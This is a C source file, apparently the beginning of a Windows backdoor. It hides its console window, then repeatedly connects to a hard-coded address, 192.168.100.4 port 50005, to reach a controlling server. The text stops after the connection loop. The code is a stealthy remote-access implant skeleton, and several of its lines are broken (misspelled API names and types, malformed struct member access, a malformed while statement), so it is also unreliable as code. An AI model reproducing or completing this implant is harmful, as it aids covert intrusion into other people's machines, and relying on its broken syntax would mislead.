#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

//Function to connect to server and API entry function. winMain used as windows use this name for entry function. 
//APIENTRY used to access other functions
//HINSTANCE represents a handle to an instance or module. OS uses this value to identify the excuatable in loaded memory and to access some functions.
//hPrev is always 0, reminant 
//lpCmdLine accesses cmd arguements, 
//nCmdShow = cmd window minimised,maximised, shown etc.

int sock; 

int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LDSTR lpCmdLine, int nCmdShow ){
//Function to hide CMD window
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);

	showWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
//WSADATA contains data on windows socket
	WSADATA wsaData; 
        ServIP="192.168.100.4";
	ServPort =50005;

        if (WSAStartup(MAKEWORD(2,0), &wsaDATA) != 0){
	       exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM,0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin.addr.s_addr= inet_addr(ServIP);
	ServAddr/sin_port = htons(ServPort);

	while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) !=0){
		Sleep(10);
	}

        	



